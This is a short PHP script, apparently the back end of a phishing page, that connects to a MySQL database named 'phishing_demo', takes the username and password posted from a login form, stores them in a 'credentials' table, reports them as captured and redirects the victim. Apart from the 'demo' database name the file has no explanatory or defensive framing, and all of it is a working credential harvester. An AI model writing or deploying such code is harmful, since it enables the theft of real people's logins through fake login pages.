<?php
// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "phishing_demo";

$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Capture user input
$user = $_POST['username'];
$pass = $_POST['password'];

// Insert credentials into the database
$sql = "INSERT INTO credentials (username, password) VALUES (?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $user, $pass);

if ($stmt->execute()) {
    echo "Credentials captured successfully. Redirecting...";
    header("Refresh: 3; url=index.php");
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>
